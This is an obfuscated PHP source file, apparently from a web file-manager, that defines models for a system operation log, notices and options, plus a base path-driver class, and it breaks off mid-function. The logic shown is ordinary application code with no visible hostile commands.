<?php
 goto c²…°ôàÇ¯; B‡ƒÙÈï›: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\162\164", "\146\x75\156\x63\164\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $šùçÅë• =& $_SERVER[ä¿÷‹µ±]; return array($šùçÅë•[2179] => LNG($šùçÅë•[2180]), $šùçÅë•[2181] => LNG($šùçÅë•[2182]), $šùçÅë•[1793] => LNG($šùçÅë•[2183]), $šùçÅë•[2184] => LNG($šùçÅë•[2185]), $šùçÅë•[2186] => LNG($šùçÅë•[2187]), $šùçÅë•[2188] => LNG($šùçÅë•[2189]), $šùçÅë•[2190] => LNG($šùçÅë•[2191]), $šùçÅë•[1823] => LNG($šùçÅë•[2191]), $šùçÅë•[1824] => LNG($šùçÅë•[2192]), $šùçÅë•[2193] => LNG($šùçÅë•[2194]), $šùçÅë•[2195] => LNG($šùçÅë•[2196]), $šùçÅë•[2197] => LNG($šùçÅë•[2198]), $šùçÅë•[2199] => LNG($šùçÅë•[2200]), $šùçÅë•[1821] => LNG($šùçÅë•[2201]), $šùçÅë•[2202] => LNG($šùçÅë•[2203]), $šùçÅë•[1828] => LNG($šùçÅë•[2204]), $šùçÅë•[2205] => LNG($šùçÅë•[2206]), $šùçÅë•[2207] => LNG($šùçÅë•[2208]), $šùçÅë•[2209] => LNG($šùçÅë•[2210]), $šùçÅë•[2211] => LNG($šùçÅë•[2212]), $šùçÅë•[1831] => LNG($šùçÅë•[2213]), $šùçÅë•[1832] => LNG($šùçÅë•[2214]), $šùçÅë•[2215] => LNG($šùçÅë•[2216]), $šùçÅë•[2217] => LNG($šùçÅë•[2218]), $šùçÅë•[2219] => LNG($šùçÅë•[2220]), $šùçÅë•[1826] => LNG($šùçÅë•[2221]), $šùçÅë•[2222] => LNG($šùçÅë•[2223]), $šùçÅë•[1825] => LNG($šùçÅë•[2224]), $šùçÅë•[2225] => LNG($šùçÅë•[2226]), $šùçÅë•[2227] => LNG($šùçÅë•[2228]), $šùçÅë•[2229] => LNG($šùçÅë•[2230]), $šùçÅë•[2231] => LNG($šùçÅë•[2231]), $šùçÅë•[2232] => LNG($šùçÅë•[1797]), $šùçÅë•[2233] => LNG($šùçÅë•[2234]), $šùçÅë•[2235] => LNG($šùçÅë•[2236]), $šùçÅë•[2237] => LNG($šùçÅë•[2238]), $šùçÅë•[2239] => LNG($šùçÅë•[2240]), $šùçÅë•[2241] => LNG($šùçÅë•[2242]), $šùçÅë•[2243] => LNG($šùçÅë•[2243]), $šùçÅë•[2244] => LNG($šùçÅë•[2245]), $šùçÅë•[2246] => LNG($šùçÅë•[2247]), $šùçÅë•[2248] => LNG($šùçÅë•[2249]), $šùçÅë•[2250] => LNG($šùçÅë•[2251]), $šùçÅë•[2252] => LNG($šùçÅë•[2253]), $šùçÅë•[2254] => LNG($šùçÅë•[2255])); } private function typeFile() { $ÕÇ“Ûª¡ =& $_SERVER[ä¿÷‹µ±]; $‚ËÈ­« = array($ÕÇ“Ûª¡[1828] => array($ÕÇ“Ûª¡[1829]), $ÕÇ“Ûª¡[2197] => array($ÕÇ“Ûª¡[2256]), $ÕÇ“Ûª¡[2199] => array($ÕÇ“Ûª¡[2257]), $ÕÇ“Ûª¡[1821] => array($ÕÇ“Ûª¡[1822]), $ÕÇ“Ûª¡[2207] => array(), $ÕÇ“Ûª¡[2209] => array(), $ÕÇ“Ûª¡[2211] => array(), $ÕÇ“Ûª¡[1831] => array($ÕÇ“Ûª¡[1833]), $ÕÇ“Ûª¡[1832] => array($ÕÇ“Ûª¡[1833]), $ÕÇ“Ûª¡[2215] => array($ÕÇ“Ûª¡[2258]), $ÕÇ“Ûª¡[2217] => array($ÕÇ“Ûª¡[2258]), $ÕÇ“Ûª¡[2219] => array($ÕÇ“Ûª¡[2259]), $ÕÇ“Ûª¡[2205] => array($ÕÇ“Ûª¡[2260]), $ÕÇ“Ûª¡[1826] => array($ÕÇ“Ûª¡[2261]), $ÕÇ“Ûª¡[2222] => array($ÕÇ“Ûª¡[2262]), $ÕÇ“Ûª¡[1825] => array($ÕÇ“Ûª¡[1827])); return $‚ËÈ­«; } private function typeAll() { $‹Ó“Û¹ö =& $_SERVER[ä¿÷‹µ±]; $Üº»ØØõ = $this->typeList; $Üàº˜äÙ = array_filter($this->typeFile()); foreach ($Üàº˜äÙ as $ˆÇÙÙ•À => $Ã£•‚) { $Üº»ØØõ[$Ã£•‚[0]] = $Üº»ØØõ[$ˆÇÙÙ•À]; } $Üº»ØØõ[$‹Ó“Û¹ö[1833]] = LNG($‹Ó“Û¹ö[2263]); $Üº»ØØõ[$‹Ó“Û¹ö[2258]] = LNG($‹Ó“Û¹ö[2264]); return $Üº»ØØõ; } public function addLog($¦Ä€«à“, $ƒ»†€·Í = array()) { $Æ§‘±· =& $_SERVER[ä¿÷‹µ±]; if (!isset($this->typeList[$¦Ä€«à“])) { return; } $“óÌÚãÕ = defined($Æ§‘±·[475]) && USER_ID ? USER_ID : (isset($ƒ»†€·Í[$Æ§‘±·[1678]]) ? $ƒ»†€·Í[$Æ§‘±·[1678]] : 0); if (!$“óÌÚãÕ) { $“óÌÚãÕ = (int) Session::get($Æ§‘±·[1987]); } if ($¦Ä€«à“ == $Æ§‘±·[2233] && is_array($ƒ»†€·Í[$Æ§‘±·[2265]]) && !$ƒ»†€·Í[$Æ§‘±·[2265]]) { return; } $·ÕàØØ© = get_client_ip(); if (!$ƒ»†€·Í || strlen(json_encode($ƒ»†€·Í)) >= 1024) { $ƒ»†€·Í = array($Æ§‘±·[2266] => $·ÕàØØ©); } else { if (is_array($ƒ»†€·Í)) { $ƒ»†€·Í[$Æ§‘±·[2266]] = $·ÕàØØ©; } else { $ƒ»†€·Í = array($Æ§‘±·[1215] => $ƒ»†€·Í, $Æ§‘±·[2266] => $·ÕàØØ©); } } $ƒ»†€·Í = array($Æ§‘±·[1668] => Session::sign(), $Æ§‘±·[1669] => $“óÌÚãÕ, $Æ§‘±·[33] => $¦Ä€«à“, $Æ§‘±·[1671] => json_encode($ƒ»†€·Í)); parent::add($ƒ»†€·Í); } public function remove($÷ ×¼ÎÚ) { $this->where(array($_SERVER[ä¿÷‹µ±][419] => $÷ ×¼ÎÚ))->delete(); } private function _makeOrder($Œóµ®Îƒ = '') { $ê¨çÔñÃ =& $_SERVER[ä¿÷‹µ±]; $Â •¹Øø = $ê¨çÔñÃ[200]; $«–“¾¸¤ = array($ê¨çÔñÃ[450] => $ê¨çÔñÃ[451], $ê¨çÔñÃ[452] => $ê¨çÔñÃ[453]); $ŠÛ Ë†‘ = Input::get($ê¨çÔñÃ[458], $ê¨çÔñÃ[7], $ê¨çÔñÃ[2019], array($ê¨çÔñÃ[1941], $ê¨çÔñÃ[452])); $ŠÛ Ë†‘ = $«–“¾¸¤[$ŠÛ Ë†‘]; $Œóµ®Îƒ = $Œóµ®Îƒ . "{$Â •¹Øø}\x20{$ŠÛ Ë†‘}"; return $this->order($Œóµ®Îƒ); } public function get($£ßìË˜ = '') { $™óªáÈå =& $_SERVER[ä¿÷‹µ±]; if (!$£ßìË˜) { show_json(array()); } $îéäÚÍ = array(); if ($£ßìË˜[$™óªáÈå[1678]]) { $îéäÚÍ[$™óªáÈå[1678]] = $£ßìË˜[$™óªáÈå[1678]]; } if (isset($£ßìË˜[$™óªáÈå[780]])) { $³·¨ĞÕô = $£ßìË˜[$™óªáÈå[780]]; $¦è²ª¥“ = isset($£ßìË˜[$™óªáÈå[497]]) ? $£ßìË˜[$™óªáÈå[497]] : time(); $îéäÚÍ[$™óªáÈå[200]] = array($™óªáÈå[333], array($³·¨ĞÕô, $¦è²ª¥“)); } if ($£ßìË˜[$™óªáÈå[33]]) { $Ôá¥¸µ… = explode($™óªáÈå[50], $£ßìË˜[$™óªáÈå[33]]); $½‰¯ğÛ“ = $this->typeFile(); $ÂªÄİ¹ = array(); foreach ($Ôá¥¸µ… as $…å‡¾Üá) { $ÂªÄİ¹[] = $…å‡¾Üá; if (isset($½‰¯ğÛ“[$…å‡¾Üá])) { $ÂªÄİ¹ = array_merge($ÂªÄİ¹, $½‰¯ğÛ“[$…å‡¾Üá]); } } $ÂªÄİ¹ = array_unique($ÂªÄİ¹); if ($ÂªÄİ¹) { $îéäÚÍ[$™óªáÈå[33]] = array($™óªáÈå[7], $ÂªÄİ¹); } } else { $îéäÚÍ[$™óªáÈå[33]] = array($™óªáÈå[2267], $™óªáÈå[2268]); } if (!empty($£ßìË˜[$™óªáÈå[2266]])) { $îéäÚÍ[$™óªáÈå[453]] = array($™óªáÈå[383], "\45{$£ßìË˜[$™óªáÈå[2266]]}\45"); } $ÑœáŠ”Ë = $this->_makeOrder()->where($îéäÚÍ)->selectPage(); if (empty($ÑœáŠ”Ë[$™óªáÈå[369]])) { show_json(array(), !0, $ÑœáŠ”Ë[$™óªáÈå[366]]); } $ÑœáŠ”Ë[$™óªáÈå[369]] = $this->logList($ÑœáŠ”Ë[$™óªáÈå[369]]); return $ÑœáŠ”Ë; } private function ipAddress(&$İÚÇ¯Ğ) { $²Ô½ò³ =& $_SERVER[ä¿÷‹µ±]; if (!empty($İÚÇ¯Ğ[$²Ô½ò³[2266]])) { $£…€é”Ã = IpLocation::get($İÚÇ¯Ğ[$²Ô½ò³[2266]]); } else { $£…€é”Ã = LNG($²Ô½ò³[2269]); } $İÚÇ¯Ğ[$²Ô½ò³[2270]] = $£…€é”Ã; } private function descZipDownload($ÉÒº¿¦¦, &$İÅ¸¨×Ë) { $âÙÉ…¯ =& $_SERVER[ä¿÷‹µ±]; if (!isset($ÉÒº¿¦¦[$âÙÉ…¯[2271]])) { return; } $¡ÅÁ€•ù = json_decode($ÉÒº¿¦¦[$âÙÉ…¯[2271]], !0); foreach ($¡ÅÁ€•ù as $¥§™À) { try { $ƒÎ¬ãÃ‰ = IO::infoFull($¥§™À[$âÙÉ…¯[84]]); } catch (Exception $Ô­ƒêŒú) { continue; } $ÉÒº¿¦¦[$âÙÉ…¯[84]] = $¥§™À[$âÙÉ…¯[84]]; $İÅ¸¨×Ë[] = $ÉÒº¿¦¦[$âÙÉ…¯[402]] = $ƒÎ¬ãÃ‰[$âÙÉ…¯[402]]; $İÅ¸¨×Ë[] = $ÉÒº¿¦¦[$âÙÉ…¯[2073]] = $ƒÎ¬ãÃ‰[$âÙÉ…¯[432]]; break; } return $ÉÒº¿¦¦; } private function getSourceList(&$‹‡¶Ç–Ê) { $×ïÖ‹¥Æ =& $_SERVER[ä¿÷‹µ±]; $‚Ê‰¡öú = array(); foreach ($‹‡¶Ç–Ê as $à¨°óç => $•œ­§ÊĞ) { $ÜÉÍÎŞÈ = json_decode($•œ­§ÊĞ[$×ïÖ‹¥Æ[453]], !0); if ($•œ­§ÊĞ[$×ïÖ‹¥Æ[33]] == $×ïÖ‹¥Æ[1824]) { $ÜÉÍÎŞÈ = $this->descZipDownload($ÜÉÍÎŞÈ, $‚Ê‰¡öú); $‹‡¶Ç–Ê[$à¨°óç][$×ïÖ‹¥Æ[453]] = json_encode($ÜÉÍÎŞÈ); continue; } if (strpos($•œ­§ÊĞ[$×ïÖ‹¥Æ[33]], $×ïÖ‹¥Æ[2075]) !== 0) { if (!isset($ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[84]]) || strpos($•œ­§ÊĞ[$×ïÖ‹¥Æ[33]], $×ïÖ‹¥Æ[2272]) !== 0) { continue; } try { $îÂÈã½© = IO::infoFull($ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[84]]); } catch (Exception $¸˜·¬) { continue; } $‚Ê‰¡öú[] = $ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[402]] = $îÂÈã½©[$×ïÖ‹¥Æ[402]]; $‚Ê‰¡öú[] = $ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[2073]] = $îÂÈã½©[$×ïÖ‹¥Æ[432]]; $‹‡¶Ç–Ê[$à¨°óç][$×ïÖ‹¥Æ[453]] = json_encode($ÜÉÍÎŞÈ); continue; } $‚Ê‰¡öú[] = $ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[402]]; $‚Ê‰¡öú[] = $ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[2073]]; if ($ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[33]] == $×ïÖ‹¥Æ[557]) { $‚Ê‰¡öú[] = $ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[453]][$×ïÖ‹¥Æ[1182]]; $‚Ê‰¡öú[] = $ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[453]][$×ïÖ‹¥Æ[1183]]; } if ($ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[33]] == $×ïÖ‹¥Æ[2083]) { $‚Ê‰¡öú[] = $ÜÉÍÎŞÈ[$×ïÖ‹¥Æ[453]][$×ïÖ‹¥Æ[402]]; } } if (!$‚Ê‰¡öú) { return array(); } return Model($×ïÖ‹¥Æ[844])->sourceListInfo($‚Ê‰¡öú, !0); } private function logList($» ¬ãÀÙ) { $³„—Êï÷ =& $_SERVER[ä¿÷‹µ±]; $üÈ¥—¥Ø = array_to_keyvalue($» ¬ãÀÙ, $³„—Êï÷[12], $³„—Êï÷[1678]); $öŠŞÙ×ø = Model($³„—Êï÷[535])->userListInfo(array_unique($üÈ¥—¥Ø)); $şĞ– íÖ = $this->getSourceList($» ¬ãÀÙ); $åèˆşø‰ = $this->typeAll(); $ğ²çáå® = array(); $Ã×¼Ò‚ê = array(); foreach ($» ¬ãÀÙ as $çŞÌ¼ë => $É¡°ÄÜ·) { $Å€°Ì = $É¡°ÄÜ·[$³„—Êï÷[33]]; $½Õé•Ö’ = isset($öŠŞÙ×ø[$É¡°ÄÜ·[$³„—Êï÷[1678]]]) ? $öŠŞÙ×ø[$É¡°ÄÜ·[$³„—Êï÷[1678]]] : !1; $´ÃÊªóÉ = strpos($Å€°Ì, $³„—Êï÷[2273]) === 0 ? LNG($³„—Êï÷[2274]) : LNG($³„—Êï÷[2269]); $É¡°ÄÜ·[$³„—Êï÷[32]] = isset($½Õé•Ö’[$³„—Êï÷[32]]) ? $½Õé•Ö’[$³„—Êï÷[32]] : LNG($³„—Êï÷[2269]); $É¡°ÄÜ·[$³„—Êï÷[542]] = isset($½Õé•Ö’[$³„—Êï÷[542]]) ? $½Õé•Ö’[$³„—Êï÷[542]] : $³„—Êï÷[12]; $É¡°ÄÜ·[$³„—Êï÷[1576]] = isset($åèˆşø‰[$Å€°Ì]) ? $åèˆşø‰[$Å€°Ì] : $´ÃÊªóÉ; $É¡°ÄÜ·[$³„—Êï÷[2018]] = $½Õé•Ö’; $ê°ú×İñ = json_decode($É¡°ÄÜ·[$³„—Êï÷[453]], !0); $É¡°ÄÜ·[$³„—Êï÷[2266]] = isset($ê°ú×İñ[$³„—Êï÷[2266]]) ? $ê°ú×İñ[$³„—Êï÷[2266]] : $³„—Êï÷[12]; $É¡°ÄÜ·[$³„—Êï÷[2270]] = IpLocation::get($É¡°ÄÜ·[$³„—Êï÷[2266]]); if (strpos($Å€°Ì, $³„—Êï÷[2075]) === 0 || isset($ê°ú×İñ[$³„—Êï÷[2073]])) { $ê°ú×İñ[$³„—Êï÷[86]] = $şĞ– íÖ[$ê°ú×İñ[$³„—Êï÷[402]]]; $ê°ú×İñ[$³„—Êï÷[2088]] = $şĞ– íÖ[$ê°ú×İñ[$³„—Êï÷[2073]]]; if ($ê°ú×İñ[$³„—Êï÷[33]] == $³„—Êï÷[557]) { $ê°ú×İñ[$³„—Êï÷[453]][$³„—Êï÷[1182]] = $şĞ– íÖ[$ê°ú×İñ[$³„—Êï÷[453]][$³„—Êï÷[1182]]]; $ê°ú×İñ[$³„—Êï÷[453]][$³„—Êï÷[1183]] = $şĞ– íÖ[$ê°ú×İñ[$³„—Êï÷[453]][$³„—Êï÷[1183]]]; } if ($ê°ú×İñ[$³„—Êï÷[33]] == $³„—Êï÷[2083]) { $ê°ú×İñ[$³„—Êï÷[453]][$³„—Êï÷[402]] = $şĞ– íÖ[$ê°ú×İñ[$³„—Êï÷[453]][$³„—Êï÷[402]]]; } if ($ê°ú×İñ[$³„—Êï÷[33]] == $³„—Êï÷[1819]) { $ê°ú×İñ[$³„—Êï÷[2088]] = $ê°ú×İñ[$³„—Êï÷[86]]; $ê°ú×İñ[$³„—Êï÷[2073]] = $ê°ú×İñ[$³„—Êï÷[2088]][$³„—Êï÷[402]]; $ê°ú×İñ[$³„—Êï÷[86]] = !1; $ê°ú×İñ[$³„—Êï÷[402]] = $³„—Êï÷[12]; } if ($ê°ú×İñ[$³„—Êï÷[86]] && $ê°ú×İñ[$³„—Êï÷[86]][$³„—Êï÷[411]] == $³„—Êï÷[1298]) { $Ã×¼Ò‚ê[] = $É¡°ÄÜ·[$³„—Êï÷[399]]; unset($» ¬ãÀÙ[$çŞÌ¼ë]); continue; } if ($ê°ú×İñ[$³„—Êï÷[2088]] && $ê°ú×İñ[$³„—Êï÷[2088]][$³„—Êï÷[411]] == $³„—Êï÷[1298]) { $Ã×¼Ò‚ê[] = $É¡°ÄÜ·[$³„—Êï÷[399]]; unset($» ¬ãÀÙ[$çŞÌ¼ë]); continue; } } $É¡°ÄÜ·[$³„—Êï÷[453]] = $ê°ú×İñ; unset($É¡°ÄÜ·[$³„—Êï÷[2275]]); $ğ²çáå®[] = $É¡°ÄÜ·; } $this->clearSystemPathLog($Ã×¼Ò‚ê); return $ğ²çáå®; } private function clearSystemPathLog($Ëì‹ÄÆä) { $º«äòà£ =& $_SERVER[ä¿÷‹µ±]; if (count($Ëì‹ÄÆä) == 0) { return; } $²¿¾®Ùó = array($º«äòà£[399] => array($º«äòà£[7], array_unique($Ëì‹ÄÆä))); $this->where($²¿¾®Ùó)->delete(); } public function deviceList($‚ÉÜ , $±†¡œşş = 0) { $†õşèÉ£ =& $_SERVER[ä¿÷‹µ±]; $ÎÅÇ†Äß = array($†õşèÉ£[1678] => $‚ÉÜ , $†õşèÉ£[200] => array($†õşèÉ£[1036], $±†¡œşş), $†õşèÉ£[33] => $†õşèÉ£[1793]); $­”°¢ÕÙ = array(); $¨¦ƒŠÁ = $this->field($†õşèÉ£[2276])->where($ÎÅÇ†Äß)->order($†õşèÉ£[2086])->limit(50)->select(); foreach ($¨¦ƒŠÁ as $ÈÇÚè‚Á => $ú¼¦‘Ğ) { if ($ÈÇÚè‚Á > 0 && abs($ú¼¦‘Ğ[$†õşèÉ£[200]] - $¨¦ƒŠÁ[$ÈÇÚè‚Á - 1][$†õşèÉ£[200]]) < 5) { continue; } $ŒôÊì = json_decode($ú¼¦‘Ğ[$†õşèÉ£[453]], !0); $ú¼¦‘Ğ[$†õşèÉ£[2266]] = isset($ŒôÊì[$†õşèÉ£[2266]]) ? $ŒôÊì[$†õşèÉ£[2266]] : $†õşèÉ£[12]; unset($ŒôÊì[$†õşèÉ£[2266]]); $êøªÓƒ˜ = $this->deviceType($ŒôÊì[$†õşèÉ£[2076]]); if (isset($­”°¢ÕÙ[$êøªÓƒ˜])) { continue; } $ú¼¦‘Ğ[$†õşèÉ£[2270]] = IpLocation::get($ú¼¦‘Ğ[$†õşèÉ£[2266]]); $ú¼¦‘Ğ[$†õşèÉ£[453]] = $ŒôÊì; $­”°¢ÕÙ[$êøªÓƒ˜] = $ú¼¦‘Ğ; } return array_values($­”°¢ÕÙ); } public function deviceType($Úşğö—¶) { return $Úşğö—¶; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\156\157\x74\x69\x63\145\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\143\x6f\156\x74\x65\156\x74", "\141\165\x74\150", "\x6d\157\x64\145", "\x74\151\155\x65", "\x74\x79\x70\x65", "\x6c\x65\x76\145\154", "\145\156\141\x62\x6c\x65", "\163\157\162\164"); public function listData($ãšÏ‰×È = false, $±º”Õ°— = "\163\x6f\x72\164", $³Î…âñÑ = false) { return parent::listData($ãšÏ‰×È, $±º”Õ°—, $³Î…âñÑ); } public function add($ë¿¿Å¶) { $¯ì›¦À¬ =& $_SERVER[ä¿÷‹µ±]; $æ³ÁêÎ¾ = time(); if ($ë¿¿Å¶[$¯ì›¦À¬[16]] == $¯ì›¦À¬[2277]) { $æ³ÁêÎ¾ = strtotime($ë¿¿Å¶[$¯ì›¦À¬[203]]); } $ë¿¿Å¶[$¯ì›¦À¬[203]] = $æ³ÁêÎ¾; return parent::insert($ë¿¿Å¶); } public function update($µõòç¸é, $ÌÚö‡Şà) { $ÎÄ÷ÖßÛ =& $_SERVER[ä¿÷‹µ±]; $È‡è÷­´ = $this->listData($µõòç¸é); if (!$È‡è÷­´) { return !1; } $ˆºæˆº“ = time(); if ($ÌÚö‡Şà[$ÎÄ÷ÖßÛ[16]] == $ÎÄ÷ÖßÛ[2277]) { $ˆºæˆº“ = strtotime($ÌÚö‡Şà[$ÎÄ÷ÖßÛ[203]]); } $ÌÚö‡Şà[$ÎÄ÷ÖßÛ[203]] = $ˆºæˆº“; return parent::update($µõòç¸é, $ÌÚö‡Şà); } public function remove($ª”„•è½) { $¾¹Ğ¢æ = $this->listData($ª”„•è½); if (!$¾¹Ğ¢æ || $¾¹Ğ¢æ[$_SERVER[ä¿÷‹µ±][1298]]) { return !1; } return parent::remove($ª”„•è½); } public function sort($ê»Š¯ü§, $‚¹ñ¾ —) { return parent::update($ê»Š¯ü§, $‚¹ñ¾ —); } public function enable($ÅßíòÀª, $ÚİÒÏ©) { return parent::update($ÅßíòÀª, array($_SERVER[ä¿÷‹µ±][2278] => $ÚİÒÏ©)); } private function initUserOption() { $òù¢×½Ã =& $_SERVER[ä¿÷‹µ±]; $this->optionType = $òù¢×½Ã[2279]; $this->modelType = $òù¢×½Ã[2280]; $this->field = array($òù¢×½Ã[2281], $òù¢×½Ã[32], $òù¢×½Ã[203], $òù¢×½Ã[33], $òù¢×½Ã[2282], $òù¢×½Ã[769], $òù¢×½Ã[195]); } public function userNoticeGet($ãò´™œ = false) { $this->initUserOption(); return parent::listData($ãò´™œ, $_SERVER[ä¿÷‹µ±][399], !0); } public function userNoticeAdd($‘—ÈíÀò) { $˜ª ²Ô =& $_SERVER[ä¿÷‹µ±]; $this->initUserOption(); $°ç²®¿û = $this->findByKey($˜ª ²Ô[2281], $‘—ÈíÀò[$˜ª ²Ô[399]]); if ($°ç²®¿û) { return !0; } $—ìàıÔª = array($˜ª ²Ô[2281] => $‘—ÈíÀò[$˜ª ²Ô[399]], $˜ª ²Ô[32] => $‘—ÈíÀò[$˜ª ²Ô[32]], $˜ª ²Ô[203] => $‘—ÈíÀò[$˜ª ²Ô[203]], $˜ª ²Ô[33] => isset($‘—ÈíÀò[$˜ª ²Ô[33]]) ? $‘—ÈíÀò[$˜ª ²Ô[33]] : 1, $˜ª ²Ô[2282] => isset($‘—ÈíÀò[$˜ª ²Ô[2282]]) ? $‘—ÈíÀò[$˜ª ²Ô[2282]] : 0, $˜ª ²Ô[769] => 0, $˜ª ²Ô[195] => 0); return parent::insert($—ìàıÔª); } public function userNoticeEdit($ˆÚûÒ¥, $ŞÎÁğÒ¶) { $this->initUserOption(); return parent::update($ˆÚûÒ¥, $ŞÎÁğÒ¶); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\x6d\x5f\x6f\x70\164\x69\x6f\156"; protected $jsonField = array("\155\x65\x6e\x75", "\x72\157\154\145", "\162\157\154\x65\x47\x72\157\x75\160", "\162\x65\147\x69\163\x74", "\145\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ü™‡ÎÃ) { return "\123\171\x73\164\x65\x6d\x4f\x70\x74\151\157\x6e\x5f{$ü™‡ÎÃ}"; } protected function optionDefault($Ò¿É¤şÈ = '') { $€ê—Ü°Å =& $_SERVER[ä¿÷‹µ±]; if ($Ò¿É¤şÈ == $€ê—Ü°Å[12]) { return $GLOBALS[$€ê—Ü°Å[6]][$€ê—Ü°Å[381]]; } } } goto Cô¥¶ä„¥©; bš‚î†àºÆ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $œû ÷ÇŒ =& $_SERVER[ä¿÷‹µ±]; $this->objectDriver = array($œû ÷ÇŒ[60], $œû ÷ÇŒ[61], $œû ÷ÇŒ[62], $œû ÷ÇŒ[63], $œû ÷ÇŒ[64], $œû ÷ÇŒ[65], $œû ÷ÇŒ[66], $œû ÷ÇŒ[67], $œû ÷ÇŒ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($º¼ï´¨¬) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($º¼ï´¨¬, $_SERVER[ä¿÷‹µ±][8]); } return $º¼ï´¨¬; } public function iconvApp($…Ò›Ë‹è) { return $…Ò›Ë‹è; } public function iconvSystem($­ ‰ŞÇ) { return $­ ‰ŞÇ; } public function iconvTo($ŠÓ†—˜±, $­¹Ÿ¬³‹, $é±¬®èô) { $ôÀƒÏº =& $_SERVER[ä¿÷‹µ±]; if (!$ŠÓ†—˜± || !function_exists($ôÀƒÏº[69])) { return $ŠÓ†—˜±; } static $Ö©’ØˆÔ = array(); $ÒäëßöŸ = $­¹Ÿ¬³‹ . $ôÀƒÏº[70] . $é±¬®èô . $ôÀƒÏº[71] . $ŠÓ†—˜±; if (isset($Ö©’ØˆÔ[$ÒäëßöŸ])) { return $Ö©’ØˆÔ[$ÒäëßöŸ]; } if (function_exists($ôÀƒÏº[72])) { $ã–àÓ°ˆ = @mb_convert_encoding($ŠÓ†—˜±, $é±¬®èô, $­¹Ÿ¬³‹); } else { $ã–àÓ°ˆ = @iconv($­¹Ÿ¬³‹, $é±¬®èô, $ŠÓ†—˜±); } $ã–àÓ°ˆ = $ã–àÓ°ˆ ? $ã–àÓ°ˆ : $ŠÓ†—˜±; if (strstr($ã–àÓ°ˆ, $ôÀƒÏº[73])) { $ã–àÓ°ˆ = str_replace($ôÀƒÏº[73], $ôÀƒÏº[11], $ã–àÓ°ˆ); } $Ö©’ØˆÔ[$­¹Ÿ¬³‹ . $ôÀƒÏº[70] . $é±¬®èô . $ôÀƒÏº[71] . $ŠÓ†—˜±] = $ã–àÓ°ˆ; $Ö©’ØˆÔ[$é±¬®èô . $ôÀƒÏº[70] . $­¹Ÿ¬³‹ . $ôÀƒÏº[71] . $ŠÓ†—˜±] = $ŠÓ†—˜±; $Ö©’ØˆÔ[$é±¬®èô . $ôÀƒÏº[70] . $­¹Ÿ¬³‹ . $ôÀƒÏº[71] . $ã–àÓ°ˆ] = $ŠÓ†—˜±; $Ö©’ØˆÔ[$­¹Ÿ¬³‹ . $ôÀƒÏº[70] . $é±¬®èô . $ôÀƒÏº[71] . $ã–àÓ°ˆ] = $ã–àÓ°ˆ; return $ã–àÓ°ˆ; } public function getPathInner($Ê»¡˜ÕÏ) { $íãÆü… = IO::init($Ê»¡˜ÕÏ); return $íãÆü…->path; } public function getPathOuter($‹È³²‘•) { $Ê¥Ñ¸Ïı =& $_SERVER[ä¿÷‹µ±]; $¦İ¨•à = strlen(trim($this->pathBase, $Ê¥Ñ¸Ïı[8])); $‹È³²‘• = substr(trim($‹È³²‘•, $Ê¥Ñ¸Ïı[8]), $¦İ¨•à); return $this->pathDriver . $Ê¥Ñ¸Ïı[8] . ltrim($‹È³²‘•, $Ê¥Ñ¸Ïı[8]); } public function isParentOf($Æ¬¸‹•Ä, $œÆÛäá) { $õ±ùÒç =& $_SERVER[ä¿÷‹µ±]; $Æ¬¸‹•Ä = rtrim(strtolower($Æ¬¸‹•Ä), $õ±ùÒç[8]) . $õ±ùÒç[8]; $œÆÛäá = rtrim(strtolower($œÆÛäá), $õ±ùÒç[8]) . $õ±ùÒç[8]; $÷¹¦£Â» = strpos($œÆÛäá, $Æ¬¸‹•Ä) === 0; return $÷¹¦£Â»; } public function getType() { $„Øª¯ =& $_SERVER[ä¿÷‹µ±]; $ÌéÂî‘ = str_replace($„Øª¯[74], $„Øª¯[12], get_class($this)); return strtolower($ÌéÂî‘); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ùëï—Ì, $‰Ô‘¿Õ) { $·ãÒ†å =& $_SERVER[ä¿÷‹µ±]; $Ùú˜€š = rtrim($ùëï—Ì, $·ãÒ†å[8]) . $·ãÒ†å[8] . $‰Ô‘¿Õ; $¤–ßÈ¢Ğ = $this->exist($Ùú˜€š); return $¤–ßÈ¢Ğ ? $Ùú˜€š : !1; } public function setModifyTime($¯ÒÄÔûí, $´•­è¿ = '') { } public function renameObject($·ëÚØ”í, $‘ù—…Í) { $ğØ³–ä® = $‘ù—…Í; $·ëÚØ”í = $this->getPathOuter($·ëÚØ”í); $‘ù—…Í = $this->pathFather($·ëÚØ”í) . $‘ù—…Í; $‘…Àİò’ = IO::copy($·ëÚØ”í, $this->pathFather($·ëÚØ”í), REPEAT_RENAME_FOLDER, $ğØ³–ä®); if ($‘…Àİò’) { IO::remove($·ëÚØ”í); } return $‘…Àİò’ ? $‘ù—…Í : !1; } public function tempFile($¡˜˜£»Ô = '', $©™Š˜ĞÄ = '') { if (!$¡˜˜£»Ô) { $¡˜˜£»Ô = rand_string(15); } $Æ´½¬’ì = TEMP_FILES . rand_string(15) . $_SERVER[ä¿÷‹µ±][8]; @mkdir($Æ´½¬’ì, DEFAULT_PERRMISSIONS, !0); $†¡•¹ş = $Æ´½¬’ì . $¡˜˜£»Ô; @touch($†¡•¹ş); if ($©™Š˜ĞÄ) { 